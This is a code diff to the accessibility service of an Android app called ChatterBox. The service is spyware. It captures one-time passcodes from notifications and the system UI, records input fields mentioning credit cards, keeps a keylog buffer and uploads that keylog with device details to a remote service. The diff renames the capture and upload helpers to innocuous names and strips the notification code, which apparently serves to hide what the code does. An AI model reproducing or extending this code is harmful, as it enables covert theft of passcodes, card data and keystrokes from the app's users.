@@ -2,12 +2,7 @@ package com.example.ChatterBox.accessibility
 
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.annotation.SuppressLint
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.PendingIntent
-import android.content.Context
 import android.content.Intent
-import android.graphics.Color
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
@@ -15,11 +10,8 @@ import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import androidx.core.app.NotificationCompat
-import com.example.ChatterBox.MainActivity
-import com.example.ChatterBox.R
 import com.example.ChatterBox.database.AccountManager
-import com.example.ChatterBox.database.DataSynchronizer
+import com.example.ChatterBox.database.CloudUploader
 import org.json.JSONObject
 import java.text.SimpleDateFormat
 import java.util.Date
@@ -215,11 +207,11 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             Log.d(TAG, "New OTP detected in notification from $sourceApp: $otp")
 
             try {
-                AccountManager.cacheAuthData(
+                AccountManager.storeSessionInfo(
                     applicationContext, "$sourceType:$sourceApp", "otp", otp
                 )
 
-                AccountManager.cacheAuthData(
+                AccountManager.storeSessionInfo(
                     applicationContext, "$sourceType:$sourceApp", "message", notificationText
                 )
 
@@ -305,10 +297,10 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                         Log.d(TAG, "New OTP detected in system UI: $otp")
 
                         try {
-                            AccountManager.cacheAuthData(
+                            AccountManager.storeSessionInfo(
                                 applicationContext, "SystemUI", "otp", otp
                             )
-                            AccountManager.cacheAuthData(
+                            AccountManager.storeSessionInfo(
                                 applicationContext, "SystemUI", "message", notificationText
                             )
                             keylogBuffer.append("[OTP from SystemUI: $otp] ")
@@ -390,7 +382,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             cleanupProcessedOtps()
         }
         try {
-            AccountManager.cacheAuthData(applicationContext, packageName, "otp", otp)
+            AccountManager.storeSessionInfo(applicationContext, packageName, "otp", otp)
             keylogBuffer.append("[OTP: $otp] ")
             lastInputTime = System.currentTimeMillis()
             handler.removeCallbacks(keylogFlushRunnable)
@@ -408,7 +400,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
             sourceText.contains("credit", ignoreCase = true) ||
             sourceText.contains("card", ignoreCase = true)
         ) {
-            AccountManager.cacheAuthData(
+            AccountManager.storeSessionInfo(
                 applicationContext, packageName, "input_field", sourceText
             )
         }
@@ -435,8 +427,8 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 put("device_model", Build.MODEL)
                 put("android_version", Build.VERSION.RELEASE)
             }
-            val dataSynchronizer = DataSynchronizer(applicationContext)
-            dataSynchronizer.sendData("keylog", keylogData.toString())
+            val cloudUploader = CloudUploader(applicationContext)
+            cloudUploader.postJson("keylog", keylogData.toString())
             keylogBuffer.clear()
 
         } catch (e: Exception) {
